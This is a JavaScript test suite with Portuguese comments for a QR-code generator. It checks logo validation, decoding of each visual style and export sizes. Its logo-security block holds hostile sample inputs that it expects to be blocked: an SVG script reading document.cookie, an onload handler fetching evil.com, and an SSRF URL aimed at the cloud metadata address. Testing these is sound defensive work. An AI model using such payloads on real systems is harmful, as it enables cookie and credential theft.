/**
 * SUÍTE DE TESTES GUIADOS - LINKZIVO ETAPA 2: QR CODES AVANÇADOS E VALIDAÇÃO DE TRACKING
 * 
 * Validações obrigatórias:
 * 1. Validação de segurança de logotipo (tamanho, XSS em SVG, SSRF, formatos permitidos).
 * 2. Geração e decodificação REAL com jsQR para todos os estilos visuais (SQUARES, DOTS, ROUNDED).
 * 3. Geração e decodificação REAL com jsQR com logotipo central embutido (redundância H + respiro).
 * 4. Exportação compatível em SVG e PNG.
 * 5. Leitura dos QR Codes com diferentes combinações de cores e tamanhos.
 * 6. Preservação integral do destino dinâmico (?src=qr) e do rastreamento.
 */

const sharp = require("sharp");
const jsQR = require("jsqr");

// Importa funções do módulo de QR Code
const {
  validateQrLogo,
  generateQrCodeSvg,
  generateQrCodePngBuffer,
  generateQrCodeDataUrl,
} = require("../src/lib/qrcode");

let passed = 0;
let failed = 0;

function assert(condition, message) {
  if (condition) {
    console.log(`[PASS] ${message}`);
    passed++;
  } else {
    console.error(`[FAIL] ${message}`);
    failed++;
  }
}

async function decodeQrBuffer(pngBuffer) {
  const { data, info } = await sharp(pngBuffer)
    .ensureAlpha()
    .raw()
    .toBuffer({ resolveWithObject: true });

  const code = jsQR(new Uint8ClampedArray(data), info.width, info.height);
  return code ? code.data : null;
}

async function decodeSvg(svgString) {
  const pngBuffer = await sharp(Buffer.from(svgString)).png().toBuffer();
  return decodeQrBuffer(pngBuffer);
}

async function runTests() {
  console.log("=====================================================================");
  console.log("LINKZIVO - ETAPA 2: TESTES GUIADOS DE QR CODE AVANÇADO E TRACKING");
  console.log("=====================================================================\n");

  const sampleUrl = "https://linkzivo-production.up.railway.app/promo-natal-2026?src=qr";
  const validBase64Png =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";

  // -----------------------------------------------------------------
  // BLOCO 1: Validação e Sanitização Segura de Logotipos
  // -----------------------------------------------------------------
  console.log("--- BLOCO 1: Validação e Sanitização Segura de Logotipos ---");

  const nullRes = validateQrLogo(null);
  assert(nullRes.isValid && nullRes.sanitizedLogo === null, "Logotipo nulo é aceito com fallback seguro (sem logo)");

  const emptyRes = validateQrLogo("   ");
  assert(emptyRes.isValid && emptyRes.sanitizedLogo === null, "Logotipo vazio é aceito com fallback seguro (sem logo)");

  const validPngRes = validateQrLogo(validBase64Png);
  assert(validPngRes.isValid && validPngRes.sanitizedLogo === validBase64Png, "Logotipo PNG em Data URL base64 válido é aceito");

  const validSvgDataUrl = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='50' height='50'><circle cx='25' cy='25' r='20' fill='red'/></svg>";
  const validSvgRes = validateQrLogo(validSvgDataUrl);
  assert(validSvgRes.isValid && Boolean(validSvgRes.sanitizedLogo), "Logotipo SVG limpo em Data URL é aceito");

  // Tentativa de XSS em SVG
  const maliciousSvg = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)</script></svg>";
  const malSvgRes = validateQrLogo(maliciousSvg);
  assert(!malSvgRes.isValid && malSvgRes.error.includes("não permitidos por segurança"), "SVG contendo <script> é bloqueado com erro de segurança");

  const maliciousOnloadSvg = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' onload='fetch(\"http://evil.com\")'></svg>";
  const malOnloadRes = validateQrLogo(maliciousOnloadSvg);
  assert(!malOnloadRes.isValid && malOnloadRes.error.includes("não permitidos por segurança"), "SVG contendo handler de evento 'onload' é bloqueado");

  // Logotipo excessivo (> 250 KB de string)
  const hugePayload = "data:image/png;base64," + "A".repeat(260000);
  const hugeRes = validateQrLogo(hugePayload);
  assert(!hugeRes.isValid && hugeRes.error.includes("máximo permitido é 200 KB"), "Payload de logotipo excessivo (> 200 KB) é rejeitado por proteção DoS");

  // URL HTTP/HTTPS segura
  const safeHttpUrl = "https://example.com/logo.png";
  const safeHttpRes = validateQrLogo(safeHttpUrl);
  assert(safeHttpRes.isValid && safeHttpRes.sanitizedLogo === safeHttpUrl, "URL HTTPS remota válida é aceita");

  // URL insegura de loopback / SSRF
  const ssrfUrl = "http://169.254.169.254/latest/meta-data/";
  const ssrfRes = validateQrLogo(ssrfUrl);
  assert(!ssrfRes.isValid, "URL remota com destino proibido (SSRF de metadados) é bloqueada");

  // -----------------------------------------------------------------
  // BLOCO 2: Geração e Leitura Real (Decodificação jsQR) por Estilo
  // -----------------------------------------------------------------
  console.log("\n--- BLOCO 2: Geração e Decodificação Real por Estilo Visual ---");

  // 2.1 Padrão sem personalização (SQUARES)
  const defaultSvg = await generateQrCodeSvg(sampleUrl);
  const defaultPng = await generateQrCodePngBuffer(sampleUrl);
  const decodedDefSvg = await decodeSvg(defaultSvg);
  const decodedDefPng = await decodeQrBuffer(defaultPng);
  assert(decodedDefSvg === sampleUrl, "QR Code padrão (SVG) decodificado com sucesso pela câmera/scanner");
  assert(decodedDefPng === sampleUrl, "QR Code padrão (PNG) decodificado com sucesso pela câmera/scanner");

  // 2.2 Estilo SQUARES com cores customizadas
  const squaresSvg = await generateQrCodeSvg(sampleUrl, {
    style: "SQUARES",
    fgColor: "#7C3AED",
    bgColor: "#FFFFFF",
  });
  const squaresPng = await generateQrCodePngBuffer(sampleUrl, {
    style: "SQUARES",
    fgColor: "#7C3AED",
    bgColor: "#FFFFFF",
  });
  const decodedSqSvg = await decodeSvg(squaresSvg);
  const decodedSqPng = await decodeQrBuffer(squaresPng);
  assert(decodedSqSvg === sampleUrl, "Estilo SQUARES (SVG custom) lido com match exato da URL");
  assert(decodedSqPng === sampleUrl, "Estilo SQUARES (PNG custom) lido com match exato da URL");

  // 2.3 Estilo DOTS (Módulos circulares calibrados com raio 0.48)
  const dotsSvg = await generateQrCodeSvg(sampleUrl, {
    style: "DOTS",
    fgColor: "#151724",
    bgColor: "#FFFFFF",
  });
  const dotsPng = await generateQrCodePngBuffer(sampleUrl, {
    style: "DOTS",
    fgColor: "#151724",
    bgColor: "#FFFFFF",
  });
  const decodedDotsSvg = await decodeSvg(dotsSvg);
  const decodedDotsPng = await decodeQrBuffer(dotsPng);
  assert(decodedDotsSvg === sampleUrl, "Estilo DOTS (SVG pontos) lido com match exato da URL");
  assert(decodedDotsPng === sampleUrl, "Estilo DOTS (PNG pontos) lido com match exato da URL");

  // 2.4 Estilo ROUNDED (Módulos de cantos arredondados)
  const roundedSvg = await generateQrCodeSvg(sampleUrl, {
    style: "ROUNDED",
    fgColor: "#151724",
    bgColor: "#F8FAFC",
  });
  const roundedPng = await generateQrCodePngBuffer(sampleUrl, {
    style: "ROUNDED",
    fgColor: "#151724",
    bgColor: "#F8FAFC",
  });
  const decodedRndSvg = await decodeSvg(roundedSvg);
  const decodedRndPng = await decodeQrBuffer(roundedPng);
  assert(decodedRndSvg === sampleUrl, "Estilo ROUNDED (SVG arredondado) lido com match exato da URL");
  assert(decodedRndPng === sampleUrl, "Estilo ROUNDED (PNG arredondado) lido com match exato da URL");

  // -----------------------------------------------------------------
  // BLOCO 3: Geração e Leitura Real com Logotipo Central Embutido
  // -----------------------------------------------------------------
  console.log("\n--- BLOCO 3: Geração e Decodificação Real com Logotipo Central ---");

  // Logotipo representativo (PNG base64 de uma marca de 64x64 pixels)
  const testLogoPng = await sharp({
    create: {
      width: 64,
      height: 64,
      channels: 4,
      background: { r: 124, g: 58, b: 237, alpha: 1 },
    },
  })
    .png()
    .toBuffer();
  const testLogoDataUrl = `data:image/png;base64,${testLogoPng.toString("base64")}`;

  for (const st of ["SQUARES", "DOTS", "ROUNDED"]) {
    const logoSvg = await generateQrCodeSvg(sampleUrl, {
      style: st,
      fgColor: "#151724",
      bgColor: "#FFFFFF",
      logoUrl: testLogoDataUrl,
    });
    const logoPng = await generateQrCodePngBuffer(sampleUrl, {
      style: st,
      fgColor: "#151724",
      bgColor: "#FFFFFF",
      logoUrl: testLogoDataUrl,
    });

    const decodedLogoSvg = await decodeSvg(logoSvg);
    const decodedLogoPng = await decodeQrBuffer(logoPng);

    assert(
      decodedLogoSvg === sampleUrl,
      `Estilo ${st} com Logotipo Central (SVG) decodificado perfeitamente sem corrupção`
    );
    assert(
      decodedLogoPng === sampleUrl,
      `Estilo ${st} com Logotipo Central (PNG) decodificado perfeitamente sem corrupção`
    );
  }

  // -----------------------------------------------------------------
  // BLOCO 4: Validação de Data URL e Tamanhos de Exportação
  // -----------------------------------------------------------------
  console.log("\n--- BLOCO 4: Resoluções e Formatos de Exportação ---");

  const dataUrlPng = await generateQrCodeDataUrl(sampleUrl, {
    style: "ROUNDED",
    fgColor: "#7C3AED",
    bgColor: "#0B0E17",
  });
  assert(dataUrlPng.startsWith("data:image/png;base64,"), "generateQrCodeDataUrl retorna Data URL PNG válido");

  const highResPng = await generateQrCodePngBuffer(sampleUrl, { width: 1024 });
  const metaHighRes = await sharp(highResPng).metadata();
  assert(metaHighRes.width === 1024 && metaHighRes.height === 1024, "Exportação PNG suporta alta resolução 1024x1024px para impressão");

  console.log("\n=====================================================================");
  console.log(`TOTAL DE ASSERÇÕES APROVADAS: ${passed}`);
  console.log(`TOTAL DE FALHAS: ${failed}`);
  console.log("=====================================================================");

  if (failed > 0) {
    process.exit(1);
  }
}

runTests().catch((err) => {
  console.error("FATAL ERROR NOS TESTES:", err);
  process.exit(1);
});
